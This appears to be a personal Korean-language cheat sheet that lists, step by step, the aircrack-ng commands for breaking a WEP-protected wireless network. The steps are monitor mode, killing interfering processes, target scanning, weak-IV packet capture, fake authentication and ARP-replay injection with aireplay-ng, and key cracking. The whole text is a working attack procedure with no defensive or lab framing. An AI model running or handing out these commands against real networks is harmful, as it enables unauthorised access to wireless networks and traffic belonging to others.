### 무선랜카드를 모니터모드로 전환
airmon-ng start [interface name]

### 모드변경 확인
iwconfig

### 작업 방해 프로세스들 종료
airmon-ng check kill

### 인터페이스 이름 확인
airmon-ng

### 공격할 무선랜 검색
BSSID와 channel 확인  
airodump-ng [interface name]

### 인터페이스 채널 맞춤
airodump-ng [interface name] --channel -[channel Num]

## 새 터미널
### weakness iv 패킷 수집 (Data가 20000개 이상 모여야함)
airodump-ng [interface name] --channel -[channel Num] --bssid [MAC] -w [Filename]

### 패킷 강제 발생
무선랜 가짜 인증  
aireplay-ng -1 [delay time] -a [bssid] [interface name]  
arp rep 강제 발생  
aireplay-ng -3 -b [bssid] [interface name]

### 암호 키 크래킹
aircrack-ng [File name]
